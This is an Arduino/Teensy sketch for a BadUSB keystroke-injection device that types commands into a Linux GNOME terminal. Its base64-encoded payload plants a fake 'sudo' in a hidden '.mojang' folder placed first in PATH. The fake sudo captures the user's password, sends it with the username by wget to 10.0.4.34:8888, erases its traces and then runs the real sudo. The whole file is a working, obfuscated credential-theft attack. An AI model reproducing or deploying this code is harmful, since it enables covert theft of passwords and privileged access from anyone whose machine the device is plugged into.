int led = 13;

void openTerminal() {
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();
  delay(150);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);

  Keyboard.println("gnome-terminal");
  delay(500);
}

void setup() {
  pinMode(led, OUTPUT);
  digitalWrite(led, LOW);
  Serial.begin(9600);
  delay(1000);

  openTerminal();
  
  Keyboard.println("cd ~");
  delay(300);
  Keyboard.println("mkdir .mojang");
  delay(300);
  Keyboard.println("cd .mojang");
  delay(300);
  Keyboard.println("echo IyEvYmluL2Jhc2gKCm1lPSIkKHdob2FtaSkiCgplY2hvIC1uICJbc3Vkb10gTW90IGRlIHBhc3NlIGRlICR7bWV9wqA6wqAiCnJlYWQgLXMgcGFzc3dvcmQKZWNobwp3Z2V0IC1xIGh0dHA6Ly8xMC4wLjQuMzQ6ODg4OC9kYXRhP3Bhc3N3b3JkPSRwYXNzd29yZCZuYW1lPSRtZQpjYXQgfi8uYmFzaHJjLm9sZCA+IH4vLmJhc2hyYwpybSB+Ly5iYXNocmMub2xkCnJtIC1mciB+Ly5tb2phbmcKZWNobyAiRMOpc29sw6ksIGVzc2F5ZXogZGUgbm91dmVhdS4iCnN1ZG8gIiQqIgo= | base64 -d > sudo && chmod +x ./sudo");
  delay(300);
  Keyboard.println("cd ~");
  delay(300);
  Keyboard.println("cp .bashrc .bashrc.old");
  delay(300);
  Keyboard.println("echo UEFUSD1+Ly5tb2phbmc6JFBBVEgK | base64 -d >> .bashrc");
  delay(300);
  Keyboard.println("echo \"export PATH\" >> .bashrc");
  delay(300);
  Keyboard.println("exit");
}

void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(led, HIGH);
  delay(1000);
  digitalWrite(led, LOW);
}
